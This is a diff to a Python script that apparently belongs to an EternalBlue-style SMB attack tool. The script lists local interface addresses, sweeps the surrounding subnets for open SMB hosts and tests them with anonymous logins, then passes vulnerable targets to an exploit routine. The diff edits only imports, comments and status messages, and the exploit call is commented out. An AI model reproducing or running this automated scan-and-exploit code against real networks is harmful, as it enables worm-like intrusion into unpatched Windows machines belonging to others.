@@ -1,12 +1,12 @@
 #!/usr/bin/python
-import gevent
+# -*- coding: utf-8 -*-
+import gevent,fcntl
+import netifaces as ni
 from gevent import socket
-from libs.mysmb import MYSMB
-from struct import pack
 from netaddr import IPNetwork
 from libs import eternal
-import netifaces as ni
-import fcntl
+from libs.mysmb import MYSMB
+from struct import pack
 
 def get_ip(ifname):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -53,7 +53,7 @@ def exploit(targets):
 def check(open_smb):
     vulnerable_smb = []
     for target in open_smb:
-        if '172.16.65.2' not in target:
+        if '172.16.65.2' not in target: # Exclude a sensitive target in the network just in case
             try:
                 conn = MYSMB(target)
                 conn.login('', '')
@@ -75,9 +75,10 @@ def check(open_smb):
 
 if __name__ == '__main__':
     TargetList = []
-    print(ret_ip())
+
+    print('[*] IPs detected from this computer: {}'.format(ret_ip()))
     for ip in ret_ip():
     	threading(ip)
     targets = check(TargetList)
-    print(targets)
+    print('[*] Vulnerable targets: {}'.format(targets))
     #exploit(targets)
